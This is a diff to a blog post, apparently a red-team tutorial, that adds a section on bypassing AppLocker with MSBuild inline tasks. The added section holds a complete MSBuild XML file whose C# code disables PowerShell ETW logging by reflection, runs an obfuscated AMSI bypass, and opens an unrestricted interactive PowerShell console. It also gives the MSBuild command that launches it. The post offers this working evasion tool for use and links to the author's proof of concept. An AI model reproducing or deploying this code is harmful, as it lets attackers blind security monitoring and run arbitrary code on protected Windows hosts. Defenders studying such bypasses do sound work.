@@ -164,7 +164,113 @@ This code will attempt to get a reference to the PSEtwLogProvider type (the type
 This code is run first, before performing the AMSI bypass, to ensure that ETW doesn't pick up on our AMSI bypass PowerShell command. When running this the executeable, you will now see that no new PowerShell log events can be viewed in EventViewer.
 
 ## Part 5 - Bypassing AppLocker
-At this point we have a .NET Assembly executeable that runs a fake PowerShell CLI that allows us to bypass CLM, AMSI and Script Block logging. Next we want to build this into an AppLocker (or generic Application Whitelisting) bypass. For this I used the classic "MSBuild" bypass to run arbritrary C# source code. MSBuild is a Microsoft signed binary that exists on most versions on Windows, aka the Microsoft Build Engine, is used to compile projects (including C# projects). The details of how and what to compile, including the configuration settings can be specified by an XML file. Starting with Microsoft .NET Framework 4.0, this XML file can specify inline tasks. These are compilation tasks to perform when a project is being compiled, that are themselves defined as C# source code within the XML file (previiously the task would have to be a precompiled .NET Assembly DLL). This allows us to specify a task that contains our PowerShell CLI code, as C# code within an XML file that when MSBuild compiles our project it will instead run our CLI and never complete (until we exit our program). <br />
+At this point we have a .NET Assembly executeable that runs a fake PowerShell CLI that allows us to bypass CLM, AMSI and Script Block logging. Next we want to build this into an AppLocker (or generic Application Whitelisting) bypass. For this I used the classic "MSBuild" bypass to run arbritrary C# source code. MSBuild is a Microsoft signed binary that exists on most versions on Windows, aka the Microsoft Build Engine, is used to compile projects (including C# projects). The details of how and what to compile, including the configuration settings can be specified by an XML file. Starting with Microsoft .NET Framework 4.0, this XML file can specify inline tasks. These are compilation tasks to perform when a project is being compiled, that are themselves defined as C# source code within the XML file (previiously the task would have to be a precompiled .NET Assembly DLL). This allows us to specify a task that contains our PowerShell CLI code, as C# code within an XML file that when MSBuild compiles our project it will instead run our CLI and never complete (until we exit our program). <br /> <br/>
+To do this, we define a new task within the XML, then specify the C# code to compile and run. This C# code must be a class that implements the Task interface. Specfically it must have a method called Execute that returns a boolean. We also need to specify in the XML what other namespaces we use, and in our case the location of the .NET assembly containing the PowerShell object (System.Management.Automation.dll). <br/><br/>
+The MSBuild XML file is:
+{% highlight csharp %}
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+    <ItemGroup>
+      <Reference Include="System" />
+      <Reference Include="System.Core" />
+      <Reference Include="System.Xml.Linq" />
+      <Reference Include="System.Data.DataSetExtensions" />
+      <Reference Include="Microsoft.CSharp" />
+      <Reference Include="System.Data" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.Xml" />
+      
+    </ItemGroup>
+ <Target Name="Hello">
+    <ClassExample/>
+ </Target>
+ 
+ <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+ <Task>
+    <Using Namespace="System"/>                                                                                                                                                                                                            
+    <Using Namespace="System.Reflection"/>                                                                                                                                                                                                 
+    <Using Namespace="System.Diagnostics"/> 
+    <Using Namespace="System.Net"/>       
+    <Using Namespace="System.Management.Automation"/>   
+    <Reference Include="System.Management.Automation" />    
+                                                                                                                                                                                            
+    <Code Type="Class" Language="cs">                                                                                                                                                                                                      
+    <![CDATA[                                                                                                                                                                                                                              
+        using System;                                                                                                                                                                                                                      
+        using System.IO;  
+        using System.Text;                                                                                                                                                                                                                 
+        using System.Reflection;                                                                                                                                                                                                           
+        using Microsoft.CSharp;                                                                                                                                                                                                            
+        using System.Runtime.InteropServices;                                                                                                                                                                                              
+        using Microsoft.Build.Framework;                                                                                                                                                                                                   
+        using Microsoft.Build.Utilities;       
+        using System.Security.Cryptography;     
+        using System.Net; 
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Collections.ObjectModel;
+                                                                                                                                                                                      
+        public class ClassExample : Task, ITask                                                                                                                                                                                            
+        {                                                                                                                                                                                                                                  
+            public override bool Execute()
+            {
+                Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            Console.WriteLine();
+	    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
+            if (PSEtwLogProvider != null){
+            	var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
+                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                EtwProvider.SetValue(null, EventProvider);
+            }
+            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) { if ($b.Name -clike \"A*U*s\") {$c =$b; break} };$d =$c.GetFields('NonPublic,Static');Foreach($e in $d) { if ($e.Name -like \"*Init*\") {$f =$e} };$f.SetValue($null, $true);";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            Console.Write("PS " + Directory.GetCurrentDirectory()+">");
+            while ((cmd = Console.ReadLine()) != null){
+                ps.AddScript(cmd);
+                try{
+                    Collection<PSObject> psOutput = ps.Invoke();
+                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
+                    foreach (ErrorRecord error in errors)
+                    {
+                        Console.WriteLine(error.ToString());
+                    }
+		    foreach (PSObject output in psOutput){
+                        if (output != null){
+                            Console.WriteLine(output.ToString());
+                        }
+                    }
+                }catch (Exception e){
+                    Console.WriteLine("**** ERROR ****");
+                    if (e.Message != null){
+                        Console.WriteLine(e.Message);
+                    }
+                    ps.Stop();
+                    ps.Commands.Clear();
+                }
+                ps.Commands.Clear();
+                Console.Write("PS " + Directory.GetCurrentDirectory()+">");    
+            }
+            rs.Close();
+            return true;
+            }
+            
+            
+        }
+        ]]>
+        </Code>
+    </Task>
+    </UsingTask>
+</Project>
+{% endhighlight %}
+Here we are specifying a Project, and including references to other .NET assemblies this project needs (in the ItemGroup > References). We say that we are going to use a task (UseTask) called ClassExample. After this the task is defined between the Task tags. We specify what namespaces need to be included. We then go on to specify the class in C# (as specified by the Code tag) with a class called ClassExample, that contains the Execute method. This is the method that will get run when MSBuild attempts to compile this project. To make sure we are compliant with this method, the very last statement is a boolean return (return true). <br/><br/>
+This file can then be run using MSBuild C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe for 64 bit and C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe for 32 bit. The command to run this is:
+{% highlight csharp %}
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-powershell.xml
+{% endhighlight %}
+{% include figure image_path="/assets/img/msbuildpowershell.png" alt="" caption="" %}
 ### GitHub link
 
 This has been combined into one POC on my GitHub, located <a href="https://github.com/ret2desync/SharpPowerShell"> here</a>
